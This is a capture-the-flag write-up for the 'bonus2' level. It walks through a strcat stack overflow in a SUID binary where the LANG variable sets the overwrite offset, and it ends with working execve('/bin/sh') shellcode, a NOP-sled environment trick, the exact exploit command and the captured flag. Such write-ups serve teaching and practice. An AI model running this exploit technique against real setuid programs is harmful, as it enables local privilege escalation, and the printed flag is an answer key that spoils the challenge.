# Bonus 2

Same recon as level0: SUID **bonus3**. NX disabled, no stack canary.

## Analysis

```c
int language;  // global, set from the LANG env var

void greetuser(void) {
    char buf[64] = {0};
    if (language == 1)       memcpy(buf, "Hyvää päivää ", 19);  // fi (UTF-8)
    else if (language == 2)  memcpy(buf, "Goedemiddag! ", 14);   // nl
    else                     memcpy(buf, "Hello ", 7);
    strcat(buf, /* main's buf */);   // no bound -> overflow
    puts(buf);
}

int main(int argc, char **argv) {
    char buf[76] = {0};
    strncpy(buf,      argv[1], 40);   // no terminator at exactly 40
    strncpy(buf + 40, argv[2], 32);   // no terminator at exactly 32
    /* set language from getenv("LANG") */
    greetuser();   // buf is copied onto greetuser's stack, where strcat reads it
}
```

Two `strncpy` calls at exactly 40 and 32 bytes leave no terminator (same bug as bonus0), fusing `argv[1]+argv[2]` into one 72-byte blob. `greetuser` prepends a greeting and `strcat`s that blob with no bound, overflowing past the saved return address.

> **LANG controls the offset.** `strcat` writes at `greeting_start + strlen(greeting)`, so the greeting's length decides how far into the saved EIP our bytes land. The greeting is chosen by `LANG`.

The greeting buffer's real base is `ebp-0x48` (the ASM uses `lea -0x48(%ebp),%eax`, not Ghidra's misleading `local_4c`). Distance to saved EIP at `ebp+4` is 76 bytes:

| LANG | Greeting | Length | Bytes left to EIP | argv[2] offset hitting EIP |
|---|---|---|---|---|
| unset | "Hello " | 7 | 70 | 30 (payload too short, no full hit) |
| fi | "Hyvää päivää " | 19 | 58 | **18** |
| nl | "Goedemiddag! " | 14 | 63 | 23 |

With the default greeting the 72-byte payload only reaches the first 2 bytes of EIP, so it can't redirect. `LANG=fi` shifts the write so 4 consecutive bytes land on EIP at argv[2] offset 18. Confirm:

```
$ export LANG=fi
$ gdb ./bonus2
(gdb) run $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
0x41366141 in ?? ()           # "Aa6A" -> offset 18 in argv[2]
```

## Exploit

NX is off, so we run stack shellcode placed in an [env var](../knowledge_base/shellcode_injection.md#environment-variable-trick) and jump into a big NOP sled.

### Shellcode (28 bytes)

Same as bonus0, execve(`/bin/sh`):

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

### Address of the sled

Export it (4096 NOPs absorb the gdb-vs-runtime drift), then read its address:

```bash
export LANG=fi
export SHELLCODE=$(python -c 'print "\x90"*4096 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

```
(gdb) b *main
(gdb) r AAAA BBBB
(gdb) p (char *)getenv("SHELLCODE")
$1 = 0xbfffee19 "\220..."
```

Sled spans `0xbfffee19`..`0xbffffe19`; aim mid-sled at `0xbffff619` → `\x19\xf6\xff\xbf` (no null bytes).

### Run

argv[1] = 40 A's, argv[2] = 18 A's + return address + 10 B's (= 32 bytes, no terminator):

```bash
./bonus2 $(python -c 'print "A"*40') $(python -c 'print "A"*18 + "\x19\xf6\xff\xbf" + "B"*10')
cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

Flag: `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
